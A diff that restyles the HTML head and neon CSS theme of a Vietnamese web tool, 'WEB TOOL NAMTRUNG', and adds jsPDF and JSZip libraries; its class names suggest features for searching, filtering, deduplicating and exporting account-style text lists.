@@ -1,1028 +1,1212 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WEB TOOL NAMTRUNG - BẢN CAO CẤP</title>
-    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-    
-    <style>
-        :root {
-            --neon-cyan: #00f3ff;
-            --neon-pink: #ff007c;
-            --neon-yellow: #f1c40f;
-            --neon-green: #00ff87;
-            --neon-purple: #9d00ff;
-            --neon-orange: #ff6b00;
-            --dark-bg: #0b0c10;
-            --panel-bg: rgba(11, 12, 16, 0.85);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WEB TOOL NAMTRUNG V2</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+:root{
+  --c1:#00f3ff; --c2:#ff007c; --c3:#f1c40f; --c4:#00ff87;
+  --c5:#9d00ff; --c6:#ff6b00; --bg:#07080d; --panel:rgba(12,14,20,.78);
+  --glass:rgba(255,255,255,.03); --stroke:rgba(255,255,255,.08);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:'Rajdhani',sans-serif; color:#fff; min-height:100vh;
+  padding:20px; padding-top:95px;
+  background:url('https://images.unsplash.com/photo-1605806616949-1e87b487cb2a?q=80&w=2070&auto=format&fit=crop') center/cover fixed;
+  transition:background-image .6s ease;
+}
+body::before{
+  content:''; position:fixed; inset:0; z-index:-1;
+  background:radial-gradient(ellipse at top,rgba(0,243,255,.08),transparent 60%),
+             radial-gradient(ellipse at bottom,rgba(255,0,124,.08),transparent 60%),
+             rgba(0,0,0,.82);
+}
 
-        * { box-sizing: border-box; }
+/* ====== HEADER / SETTINGS ====== */
+.settings-container{position:fixed; top:18px; left:18px; z-index:100}
+.btn-settings{
+  display:flex; align-items:center; gap:10px;
+  background:linear-gradient(135deg,rgba(0,0,0,.85),rgba(0,243,255,.1));
+  border:1px solid var(--c1); color:var(--c1);
+  padding:12px 22px; border-radius:12px;
+  font-family:'Rajdhani'; font-weight:700; font-size:15px;
+  letter-spacing:1.5px; cursor:pointer; backdrop-filter:blur(12px);
+  transition:all .3s; box-shadow:0 0 15px rgba(0,243,255,.2);
+}
+.btn-settings:hover{transform:translateY(-2px); box-shadow:0 0 25px rgba(0,243,255,.6)}
+.btn-settings .gear{display:inline-block; transition:transform .6s}
+.btn-settings:hover .gear{transform:rotate(180deg)}
 
-        body {
-            font-family: 'Rajdhani', sans-serif;
-            margin: 0;
-            padding: 20px;
-            padding-top: 90px;
-            min-height: 100vh;
-            color: #fff;
-            background-image: url('https://images.unsplash.com/photo-1605806616949-1e87b487cb2a?q=80&w=2070&auto=format&fit=crop');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            transition: background-image 0.5s ease-in-out;
-        }
+.theme-menu{
+  display:none; position:absolute; top:58px; left:0;
+  background:rgba(10,12,18,.97); backdrop-filter:blur(20px);
+  border:1px solid rgba(0,243,255,.35); border-radius:14px;
+  width:255px; flex-direction:column; overflow:hidden;
+  box-shadow:0 15px 50px rgba(0,0,0,.9), 0 0 25px rgba(0,243,255,.25);
+}
+.theme-menu.show{display:flex; animation:fadeUp .3s}
+.theme-menu-header{
+  padding:13px 16px; font-size:13px; font-weight:700; letter-spacing:2px;
+  color:var(--c1); background:linear-gradient(90deg,rgba(0,243,255,.2),transparent);
+  border-bottom:1px solid rgba(0,243,255,.2);
+}
+.theme-btn{
+  background:transparent; border:none; color:#fff; text-align:left;
+  padding:12px 16px; font-family:'Rajdhani'; font-size:15px; font-weight:600;
+  cursor:pointer; transition:.22s; border-bottom:1px solid rgba(255,255,255,.05);
+  display:flex; align-items:center; gap:12px;
+}
+.theme-btn:last-child{border-bottom:none}
+.theme-btn:hover{background:rgba(0,243,255,.14); padding-left:22px; color:var(--c1)}
+.theme-btn .theme-icon{font-size:22px}
+.theme-btn .theme-info{display:flex; flex-direction:column}
+.theme-btn small{font-size:11px; color:#7c8896}
 
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            z-index: -1;
-        }
+/* ====== TITLE ====== */
+.page-title{
+  text-align:center; font-family:'Orbitron',sans-serif;
+  font-size:clamp(24px,4vw,42px); font-weight:900; letter-spacing:3px;
+  margin:0 0 30px; color:#fff;
+  text-shadow:0 0 8px var(--c1), 0 0 24px var(--c1), 0 0 4px #fff;
+  animation:pulseGlow 3s ease-in-out infinite;
+}
+@keyframes pulseGlow{50%{text-shadow:0 0 12px var(--c1),0 0 30px var(--c1),0 0 6px #fff}}
 
-        .modal-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center;
-            backdrop-filter: blur(5px);
-        }
-        .modal-content {
-            background: var(--panel-bg); border: 2px solid var(--neon-cyan); padding: 30px 40px; 
-            border-radius: 15px; max-width: 650px; text-align: center; box-shadow: 0 0 30px rgba(0, 243, 255, 0.4);
-            animation: fadeIn 0.4s ease-out;
-        }
-        .modal-content h3 { color: var(--neon-cyan); margin-top: 0; font-size: 28px; letter-spacing: 1px; }
-        .modal-content p { font-size: 19px; line-height: 1.6; color: #e0e0e0; margin-bottom: 15px; }
-        .modal-content a { color: var(--neon-pink); font-weight: bold; text-decoration: none; word-break: break-all; transition: 0.3s;}
-        .modal-content a:hover { color: var(--neon-yellow); text-shadow: 0 0 10px var(--neon-pink); }
-        .modal-btn {
-            margin-top: 20px; padding: 12px 35px; background: linear-gradient(45deg, #00f3ff, #0051ff); 
-            color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 18px; 
-            cursor: pointer; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase;
-        }
-        .modal-btn:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--neon-cyan); }
+/* ====== LAYOUT ====== */
+.main-wrapper{display:flex; gap:22px; max-width:1550px; margin:0 auto; align-items:flex-start}
 
-        .settings-container { position: fixed; top: 15px; left: 15px; z-index: 100; }
-        .btn-settings {
-            display: flex; align-items: center; gap: 8px;
-            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,243,255,0.08));
-            border: 1px solid var(--neon-cyan); color: var(--neon-cyan);
-            padding: 11px 20px; border-radius: 10px; font-family: 'Rajdhani', sans-serif;
-            font-weight: 700; font-size: 15px; letter-spacing: 1.5px; cursor: pointer;
-            backdrop-filter: blur(10px); transition: all 0.3s ease;
-            box-shadow: 0 0 12px rgba(0, 243, 255, 0.15);
-        }
-        .btn-settings:hover {
-            background: linear-gradient(135deg, rgba(0,243,255,0.15), rgba(0,243,255,0.05));
-            box-shadow: 0 0 22px rgba(0, 243, 255, 0.55);
-            transform: translateY(-2px);
-        }
-        .btn-settings .gear { display: inline-block; transition: transform 0.6s ease; }
-        .btn-settings:hover .gear { transform: rotate(180deg); }
+/* ====== SIDEBAR ====== */
+.guide-sidebar{
+  width:390px; flex-shrink:0; background:var(--panel); backdrop-filter:blur(20px);
+  padding:26px; border-radius:18px;
+  border:1px solid rgba(255,0,124,.28);
+  box-shadow:0 0 30px rgba(255,0,124,.12);
+}
+.guide-title{
+  text-align:center; font-family:'Orbitron'; font-size:22px; color:var(--c2);
+  font-weight:700; margin-bottom:22px; border-bottom:2px dashed var(--c2);
+  padding-bottom:14px; letter-spacing:2px;
+}
+.guide-box{
+  background:var(--glass); padding:18px; border-radius:12px;
+  border-left:4px solid var(--c1); margin-bottom:16px;
+  transition:.25s;
+}
+.guide-box:hover{background:rgba(0,243,255,.05); transform:translateX(4px)}
+.guide-box.purple{border-left-color:var(--c5)}
+.guide-box.green{border-left-color:var(--c4)}
+.guide-box.orange{border-left-color:var(--c6); margin-bottom:0}
+.guide-box.red{border-left-color:var(--c2)}
+.guide-box h3{margin:0 0 10px; color:var(--c1); font-size:20px}
+.guide-box.purple h3{color:var(--c5)}
+.guide-box.green h3{color:var(--c4)}
+.guide-box.orange h3{color:var(--c6)}
+.guide-box.red h3{color:var(--c2)}
+.guide-box ul{padding-left:20px; margin:0; color:#dcdde1; font-size:15.5px; line-height:1.7}
+.guide-box li{margin-bottom:8px}
+.guide-box b{color:#fff}
+.guide-box i{color:#a0aec0}
+.subtitle{color:#a0aec0; font-size:13.5px; margin:-4px 0 12px; font-style:italic}
 
-        .theme-menu {
-            display: none; position: absolute; top: 55px; left: 0;
-            background: rgba(11, 12, 16, 0.96); backdrop-filter: blur(20px);
-            border: 1px solid rgba(0, 243, 255, 0.4); border-radius: 12px; width: 250px;
-            flex-direction: column; overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.9), 0 0 22px rgba(0,243,255,0.25);
-        }
-        .theme-menu.show { display: flex; animation: fadeIn 0.3s; }
-        .theme-menu-header {
-            padding: 12px 15px; font-size: 13px; font-weight: 700; letter-spacing: 2px;
-            color: var(--neon-cyan); text-transform: uppercase;
-            background: linear-gradient(90deg, rgba(0,243,255,0.18), transparent);
-            border-bottom: 1px solid rgba(0,243,255,0.2);
-        }
-        .theme-btn {
-            background: transparent; border: none; color: #fff; text-align: left;
-            padding: 12px 15px; font-family: 'Rajdhani', sans-serif; font-size: 15px; font-weight: 600;
-            cursor: pointer; transition: all 0.22s ease;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            display: flex; align-items: center; gap: 12px;
-        }
-        .theme-btn:last-child { border-bottom: none; }
-        .theme-btn:hover { background: rgba(0, 243, 255, 0.15); padding-left: 20px; color: var(--neon-cyan); }
-        .theme-btn .theme-icon { font-size: 20px; line-height: 1; }
-        .theme-btn .theme-info { display: flex; flex-direction: column; }
-        .theme-btn .theme-info b { font-size: 15px; }
-        .theme-btn .theme-info small { font-size: 11px; color: #7c8896; font-weight: 500; letter-spacing: 0.3px; }
-        .theme-btn:hover .theme-info small { color: #a8b2c1; }
+/* ====== CONTAINER ====== */
+.container{
+  flex:1; background:var(--panel); backdrop-filter:blur(20px);
+  padding:30px; border-radius:18px; border:1px solid rgba(0,243,255,.28);
+  box-shadow:0 0 45px rgba(0,243,255,.14);
+  margin-bottom:30px;
+}
 
-        .page-title {
-            text-align: center; font-size: 38px; font-weight: 700; margin-top: 0; margin-bottom: 30px;
-            letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--neon-cyan), 0 0 20px var(--neon-cyan);
-        }
+/* ====== TABS ====== */
+.tabs{
+  display:flex; justify-content:center; gap:12px; margin-bottom:28px;
+  border-bottom:1px solid rgba(255,255,255,.08); padding-bottom:16px;
+  flex-wrap:wrap;
+}
+.tab-btn{
+  position:relative; font-family:'Rajdhani'; font-size:17px; font-weight:700;
+  padding:12px 26px; text-transform:uppercase; letter-spacing:1px;
+  background:rgba(255,255,255,.04); border:1px solid rgba(255,255,255,.15);
+  color:#fff; border-radius:10px; cursor:pointer; transition:.3s;
+}
+.tab-btn:hover{background:rgba(0,243,255,.08); transform:translateY(-2px)}
+.tab-btn.active{background:rgba(0,243,255,.18); border-color:var(--c1); color:var(--c1); box-shadow:0 0 18px rgba(0,243,255,.45)}
+.tab-btn.active-purple{background:rgba(157,0,255,.18); border-color:var(--c5); color:#d896ff; box-shadow:0 0 18px rgba(157,0,255,.45)}
+.tab-btn.active-green{background:rgba(0,255,135,.18); border-color:var(--c4); color:var(--c4); box-shadow:0 0 18px rgba(0,255,135,.45)}
+.tab-btn.active-orange{background:rgba(255,107,0,.18); border-color:var(--c6); color:var(--c6); box-shadow:0 0 18px rgba(255,107,0,.45)}
+.tab-btn.active-yellow{background:rgba(241,196,15,.18); border-color:var(--c3); color:var(--c3); box-shadow:0 0 18px rgba(241,196,15,.45)}
 
-        .main-wrapper { display: flex; gap: 20px; max-width: 1500px; margin: 0 auto; align-items: flex-start; }
+.tab-content{display:none; animation:fadeUp .5s}
+.tab-content.active{display:block}
+@keyframes fadeUp{from{opacity:0; transform:translateY(12px)} to{opacity:1; transform:translateY(0)}}
 
-        .guide-sidebar {
-            width: 380px; flex-shrink: 0; background: var(--panel-bg); backdrop-filter: blur(15px);
-            padding: 25px; border-radius: 15px; border: 1px solid rgba(255, 0, 124, 0.3);
-            box-shadow: 0 0 20px rgba(255, 0, 124, 0.1);
-        }
-        .guide-title {
-            text-align: center; font-size: 26px; color: var(--neon-pink); font-weight: bold; 
-            margin-bottom: 20px; border-bottom: 1px dashed var(--neon-pink); padding-bottom: 10px;
-        }
-        .guide-box { background: rgba(255,255,255,0.02); padding: 18px; border-radius: 10px; border-left: 4px solid var(--neon-cyan); margin-bottom: 20px; }
-        .guide-box.purple { border-left-color: var(--neon-purple); }
-        .guide-box.green { border-left-color: var(--neon-green); }
-        .guide-box.orange { border-left-color: var(--neon-orange); margin-bottom: 0; }
-        .guide-box h3 { margin-top: 0; margin-bottom: 12px; color: var(--neon-cyan); font-size: 22px; }
-        .guide-box.purple h3 { color: var(--neon-purple); }
-        .guide-box.green h3 { color: var(--neon-green); }
-        .guide-box.orange h3 { color: var(--neon-orange); }
-        .guide-box ul { padding-left: 20px; margin: 0; color: #dcdde1; font-size: 16px; line-height: 1.7; }
-        .guide-box li { margin-bottom: 10px; }
-        .guide-box b { color: #fff; }
-        .guide-box i { color: #a0aec0; }
-        .subtitle { color: #a0aec0; font-size: 14px; margin-top: -8px; margin-bottom: 12px; font-style: italic; }
+/* ====== PANELS ====== */
+.control-panel{display:grid; grid-template-columns:1fr 1fr 1fr; gap:14px; margin-bottom:18px}
+.control-panel-2{display:flex; gap:15px; margin-bottom:20px; flex-wrap:wrap; justify-content:center}
+.control-group{
+  background:var(--glass); padding:16px; border-radius:12px;
+  border:1px dashed rgba(0,243,255,.22);
+  display:flex; flex-direction:column; gap:10px;
+}
+.group-title{font-weight:700; font-size:16px; letter-spacing:1px}
 
-        .container {
-            flex: 1; background: var(--panel-bg); backdrop-filter: blur(15px);
-            padding: 30px; border-radius: 15px; border: 1px solid rgba(0, 243, 255, 0.3);
-            box-shadow: 0 0 40px rgba(0, 243, 255, 0.15); margin-bottom: 30px;
-        }
+input[type="file"], select, input[type="number"], input[type="text"], textarea{
+  font-family:'Rajdhani'; font-size:16px;
+  background:rgba(0,0,0,.6); border:1px solid rgba(255,255,255,.18);
+  color:#fff; padding:11px; border-radius:8px; outline:none;
+  transition:.3s; width:100%;
+}
+input:focus, select:focus, textarea:focus{border-color:var(--c1); box-shadow:0 0 12px rgba(0,243,255,.3)}
+input[type="file"]::file-selector-button{
+  background:#2d3436; color:#fff; border:none; padding:6px 12px;
+  border-radius:5px; cursor:pointer; font-family:'Rajdhani'; font-weight:700;
+}
+textarea{resize:vertical; min-height:180px; font-family:'Share Tech Mono',monospace; font-size:14px}
 
-        .tabs { display: flex; justify-content: center; gap: 15px; margin-bottom: 30px; border-bottom: 2px solid rgba(255, 255, 255, 0.1); padding-bottom: 15px; flex-wrap: wrap; }
-        .tab-btn {
-            font-family: 'Rajdhani', sans-serif; font-size: 20px; font-weight: 700; padding: 12px 30px; text-transform: uppercase;
-            background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); color: #fff; border-radius: 8px; cursor: pointer; transition: 0.3s;
-        }
-        .tab-btn:hover { background: rgba(0, 243, 255, 0.1); }
-        .tab-btn.active { background: rgba(0, 243, 255, 0.2); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 243, 255, 0.4); }
-        .tab-btn.active-purple { background: rgba(157, 0, 255, 0.2); border-color: var(--neon-purple); color: #d896ff; box-shadow: 0 0 15px rgba(157, 0, 255, 0.4); }
-        .tab-btn.active-green { background: rgba(0, 255, 135, 0.2); border-color: var(--neon-green); color: var(--neon-green); box-shadow: 0 0 15px rgba(0, 255, 135, 0.4); }
-        .tab-btn.active-orange { background: rgba(255, 107, 0, 0.2); border-color: var(--neon-orange); color: var(--neon-orange); box-shadow: 0 0 15px rgba(255, 107, 0, 0.45); }
-        
-        .tab-content { display: none; animation: fadeIn 0.5s; }
-        .tab-content.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+button.action-btn{
+  font-family:'Rajdhani'; font-size:16px; font-weight:700;
+  padding:12px 18px; text-transform:uppercase; letter-spacing:1px;
+  border:none; border-radius:9px; cursor:pointer; transition:.3s; color:#fff; width:100%;
+}
+.btn-search{background:linear-gradient(45deg,#00d2ff,#3a7bd5)}
+.btn-filter{background:linear-gradient(45deg,#ff007c,#8a2387)}
+.btn-skin{background:linear-gradient(45deg,#f1c40f,#e67e22)}
+.btn-cut{background:linear-gradient(45deg,#9d00ff,#4a00e0); font-size:17px; padding:14px}
+.btn-dedup{background:linear-gradient(45deg,#ff0099,#493240); font-size:17px; padding:14px}
+.btn-txt{background:linear-gradient(45deg,#00b09b,#96c93d); font-size:17px; padding:14px}
+button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box-shadow:0 8px 20px rgba(0,0,0,.4)}
 
-        .control-panel { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-bottom: 20px; }
-        .control-panel-2 { display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; justify-content: center; }
-        .control-group { background: rgba(255, 255, 255, 0.03); padding: 15px; border-radius: 8px; border: 1px dashed rgba(0, 243, 255, 0.2); display: flex; flex-direction: column; gap: 10px; }
-        .group-title { font-weight: bold; font-size: 18px; }
+.radio-group{display:flex; gap:18px; align-items:center; justify-content:center; flex-wrap:wrap; padding:10px; font-size:17px}
+.radio-group label{cursor:pointer; display:flex; align-items:center; gap:6px; font-weight:600}
+.radio-group input[type="radio"]{width:18px; height:18px; accent-color:var(--c5); cursor:pointer}
 
-        input[type="file"], select, input[type="number"], input[type="text"] {
-            font-family: 'Rajdhani', sans-serif; font-size: 16px; background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 255, 255, 0.2);
-            color: #fff; padding: 10px; border-radius: 5px; outline: none; transition: 0.3s; width: 100%;
-        }
-        input:focus, select:focus { border-color: var(--neon-cyan); }
-        input[type="file"]::file-selector-button {
-            background: #444; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-family: 'Rajdhani', sans-serif;
-        }
+/* ====== DISPLAY ====== */
+.displayArea{
+  background:rgba(0,0,0,.82); border:1px solid rgba(255,255,255,.1);
+  border-radius:12px; padding:16px; height:520px; overflow-y:auto;
+  font-family:'Share Tech Mono',monospace; font-size:14px; line-height:1.65; color:#a8b2c1;
+}
+.displayArea::-webkit-scrollbar{width:10px}
+.displayArea::-webkit-scrollbar-track{background:rgba(0,0,0,.4)}
+.displayArea::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--c1),var(--c5)); border-radius:5px}
 
-        button.action-btn {
-            font-family: 'Rajdhani', sans-serif; font-size: 16px; font-weight: 700; padding: 10px 15px; text-transform: uppercase; border: none; border-radius: 5px;
-            cursor: pointer; transition: all 0.3s ease; color: #fff; width: 100%;
-        }
-        .btn-search { background: linear-gradient(45deg, #00d2ff, #3a7bd5); }
-        .btn-filter { background: linear-gradient(45deg, #ff007c, #8a2387); }
-        .btn-skin { background: linear-gradient(45deg, #f1c40f, #e67e22); }
-        .btn-cut { background: linear-gradient(45deg, #9d00ff, #4a00e0); font-size: 18px; padding: 15px; }
-        button.action-btn:hover { transform: translateY(-2px); filter: brightness(1.2); }
+.top-bar{display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; flex-wrap:wrap; gap:10px}
+.info-text{font-size:17px; color:#a0aec0}
+.info-text b{color:#fff}
+.action-bar{display:none; gap:12px; flex-wrap:wrap}
+.btn-copy-all,.btn-export{
+  padding:9px 16px; border-radius:8px; cursor:pointer; font-weight:700;
+  font-family:'Rajdhani'; font-size:15px; transition:.3s;
+}
+.btn-copy-all{background:rgba(0,255,135,.15); border:1px solid var(--c4); color:var(--c4)}
+.btn-copy-all:hover{background:var(--c4); color:#000}
+.btn-export{background:rgba(0,243,255,.15); border:1px solid var(--c1); color:var(--c1)}
+.btn-export:hover{background:var(--c1); color:#000}
 
-        .radio-group { display: flex; gap: 20px; align-items: center; justify-content: center; font-size: 18px; padding: 10px; flex-wrap: wrap; }
-        .radio-group label { cursor: pointer; display: flex; align-items: center; gap: 5px; font-weight: 600; }
-        .radio-group input[type="radio"] { width: 20px; height: 20px; accent-color: var(--neon-purple); cursor: pointer; }
+.acc-line{
+  display:flex; justify-content:space-between; align-items:flex-start;
+  margin-bottom:10px; padding:11px 12px;
+  background:rgba(255,255,255,.02); border-radius:8px;
+  border-left:3px solid transparent; gap:14px; transition:.2s;
+}
+.acc-line:hover{background:rgba(255,255,255,.06); border-left-color:var(--c1)}
+.acc-content{flex:1; word-break:break-word}
+.btn-copy-single{
+  background:#2d3436; color:#fff; border:1px solid #636e72;
+  padding:5px 11px; font-size:12px; border-radius:5px; cursor:pointer;
+  transition:.2s; font-family:'Rajdhani'; font-weight:700;
+  white-space:nowrap;
+}
+.btn-copy-single:hover{background:#fff; color:#000; border-color:#fff}
 
-        .displayArea { background: rgba(0, 0, 0, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 15px; height: 500px; overflow-y: auto; font-family: 'Share Tech Mono', monospace; font-size: 14px; line-height: 1.6; color: #a8b2c1; }
-        .displayArea::-webkit-scrollbar { width: 8px; }
-        .displayArea::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.3); border-radius: 4px; }
+.highlight{color:#000; background:var(--c2); padding:2px 6px; border-radius:4px; font-weight:700}
+.highlight-vip{color:#000; background:var(--c3); padding:2px 6px; border-radius:4px; font-weight:700}
+.highlight-skin{color:#000; background:var(--c4); padding:2px 6px; border-radius:4px; font-weight:700}
 
-        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
-        .info-text { font-size: 18px; color: #a0aec0; }
-        .info-text b { color: #fff; }
-        .action-bar { display: none; gap: 15px; flex-wrap: wrap; }
-        .btn-copy-all { background: rgba(0, 255, 135, 0.2); border: 1px solid var(--neon-green); color: var(--neon-green); padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn-copy-all:hover { background: var(--neon-green); color: #000; }
-        .btn-export { background: rgba(0, 243, 255, 0.2); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn-export:hover { background: var(--neon-cyan); color: #000; }
+/* ====== MINI GUIDE ====== */
+.guide-box-mini{
+  background:rgba(255,107,0,.06); padding:16px 20px;
+  border-radius:12px; border-left:4px solid var(--c6);
+  margin-bottom:18px;
+}
+.guide-box-mini h3{margin:0 0 10px; color:var(--c6); font-size:19px; display:flex; align-items:center; gap:8px}
+.guide-box-mini ul{padding-left:20px; margin:0; color:#dcdde1; font-size:15px; line-height:1.7}
+.guide-box-mini li{margin-bottom:6px}
 
-        .acc-line { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; padding: 10px; background: rgba(255, 255, 255, 0.02); border-radius: 4px; border-left: 2px solid transparent; gap: 15px; transition: 0.2s;}
-        .acc-line:hover { background: rgba(255, 255, 255, 0.05); border-left: 3px solid #fff; }
-        .acc-content { flex: 1; word-break: break-word; }
-        .btn-copy-single { background: #2d3436; color: #fff; border: 1px solid #636e72; padding: 5px 10px; font-size: 12px; border-radius: 3px; cursor: pointer; transition: 0.2s; font-family: 'Rajdhani', sans-serif; font-weight: bold;}
-        .btn-copy-single:hover { background: #fff; color: #000; border-color: #fff; }
+/* ====== FILE LIST ====== */
+.file-list-box{
+  background:rgba(0,0,0,.5); border:1px dashed rgba(255,107,0,.4);
+  border-radius:10px; padding:8px 12px; max-height:240px; overflow-y:auto;
+  font-family:'Share Tech Mono',monospace; font-size:13px;
+}
+.file-list-box::-webkit-scrollbar{width:6px}
+.file-list-box::-webkit-scrollbar-thumb{background:rgba(255,107,0,.5); border-radius:3px}
+.file-item{
+  display:flex; justify-content:space-between; align-items:center;
+  padding:8px 6px; border-bottom:1px solid rgba(255,255,255,.05); gap:10px;
+}
+.file-item:last-child{border-bottom:none}
+.file-item .idx{
+  color:var(--c6); font-weight:700; min-width:30px; text-align:center;
+  background:rgba(255,107,0,.15); border-radius:5px; padding:2px 0;
+}
+.file-item .fname{flex:1; word-break:break-all; color:#fff}
+.file-item .fmeta{color:#a0aec0; font-size:12px; white-space:nowrap}
 
-        .highlight { color: #fff; background: var(--neon-pink); padding: 2px 5px; border-radius: 3px; }
-        .highlight-vip { color: #000; background: var(--neon-yellow); padding: 2px 5px; border-radius: 3px; }
-        .highlight-skin { color: #000; background: var(--neon-green); padding: 2px 5px; border-radius: 3px; }
+.warn-box{
+  margin-top:12px; padding:12px 16px;
+  background:rgba(255,107,0,.1); border-left:4px solid var(--c6);
+  border-radius:8px; font-size:14px; color:#ffb380; line-height:1.55;
+}
+.warn-box b{color:var(--c6)}
+.blink{animation:blinkWarn 1.2s infinite}
+@keyframes blinkWarn{0%,100%{opacity:1}50%{opacity:.45}}
 
-        .guide-box-mini {
-            background: rgba(255, 107, 0, 0.06);
-            padding: 15px 18px;
-            border-radius: 10px;
-            border-left: 4px solid var(--neon-orange);
-            margin-bottom: 18px;
-        }
-        .guide-box-mini h3 {
-            margin: 0 0 10px 0; color: var(--neon-orange); font-size: 20px;
-            display: flex; align-items: center; gap: 8px;
-        }
-        .guide-box-mini ul { padding-left: 20px; margin: 0; color: #dcdde1; font-size: 15px; line-height: 1.7; }
-        .guide-box-mini li { margin-bottom: 6px; }
-        .guide-box-mini li:last-child { margin-bottom: 0; }
-        .guide-box-mini b { color: #fff; }
-        .guide-box-mini i { color: #a0aec0; }
+.btn-clear-ghep{
+  background:rgba(255,0,80,.13); border:1px solid #ff0050; color:#ff5075;
+  padding:11px 18px; border-radius:9px; font-family:'Rajdhani';
+  font-weight:700; font-size:15px; cursor:pointer; transition:.25s;
+  width:100%; margin-top:10px; letter-spacing:1px;
+}
+.btn-clear-ghep:hover{background:#ff0050; color:#fff; box-shadow:0 0 20px rgba(255,0,80,.6)}
 
-        .file-list-box {
-            background: rgba(0,0,0,0.45);
-            border: 1px dashed rgba(255,107,0,0.35);
-            border-radius: 8px;
-            padding: 6px 10px;
-            max-height: 220px;
-            overflow-y: auto;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 13px;
-        }
-        .file-list-box::-webkit-scrollbar { width: 6px; }
-        .file-list-box::-webkit-scrollbar-thumb { background: rgba(255,107,0,0.5); border-radius: 3px; }
-        .file-item {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 8px 5px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            gap: 10px;
-        }
-        .file-item:last-child { border-bottom: none; }
-        .file-item .idx {
-            color: var(--neon-orange); font-weight: bold; min-width: 28px; text-align: center;
-            background: rgba(255,107,0,0.12); border-radius: 4px; padding: 2px 0;
-        }
-        .file-item .fname { flex: 1; word-break: break-all; color: #fff; }
-        .file-item .fmeta { color: #a0aec0; font-size: 12px; white-space: nowrap; }
+/* ====== TOAST ====== */
+.toast{
+  position:fixed; bottom:30px; right:30px;
+  background:rgba(0,0,0,.92); border:2px solid var(--c1);
+  border-radius:12px; padding:15px 24px; color:#fff;
+  font-size:16px; font-weight:600;
+  box-shadow:0 0 30px rgba(0,243,255,.6);
+  z-index:9998; animation:toastIn .4s ease-out;
+}
+.toast b{color:var(--c1)}
+@keyframes toastIn{from{opacity:0; transform:translateY(20px)} to{opacity:1; transform:translateY(0)}}
 
-        .warn-box {
-            margin-top: 6px; padding: 12px 15px;
-            background: rgba(255, 107, 0, 0.10);
-            border-left: 4px solid var(--neon-orange);
-            border-radius: 6px;
-            font-size: 14px; color: #ffb380;
-            line-height: 1.5;
-        }
-        .warn-box b { color: var(--neon-orange); }
-        .warn-box .blink { animation: blinkWarn 1.2s infinite; }
-        @keyframes blinkWarn { 0%,100% { opacity: 1; } 50% { opacity: 0.45; } }
+.limit-note{
+  text-align:center; padding:14px; margin-top:8px;
+  background:rgba(0,243,255,.06); border-radius:8px;
+  color:#7c8896; font-style:italic; font-size:14px;
+}
 
-        /* Nút xóa toàn bộ file lưu trữ */
-        .btn-clear-ghep {
-            background: rgba(255, 0, 80, 0.15);
-            border: 1px solid #ff0050;
-            color: #ff5075;
-            padding: 10px 18px;
-            border-radius: 6px;
-            font-family: 'Rajdhani', sans-serif;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            transition: 0.25s;
-            width: 100%;
-            margin-top: 8px;
-            letter-spacing: 1px;
-        }
-        .btn-clear-ghep:hover {
-            background: #ff0050;
-            color: #fff;
-            box-shadow: 0 0 18px rgba(255, 0, 80, 0.55);
-        }
+/* ====== MODAL ====== */
+.modal-overlay{
+  display:none; position:fixed; inset:0;
+  background:rgba(0,0,0,.88); z-index:9999;
+  justify-content:center; align-items:center;
+  backdrop-filter:blur(6px); padding:20px;
+}
+.modal-content{
+  background:var(--panel); border:2px solid var(--c1);
+  padding:32px 40px; border-radius:18px; max-width:660px;
+  text-align:center; box-shadow:0 0 40px rgba(0,243,255,.4);
+  animation:fadeUp .4s;
+}
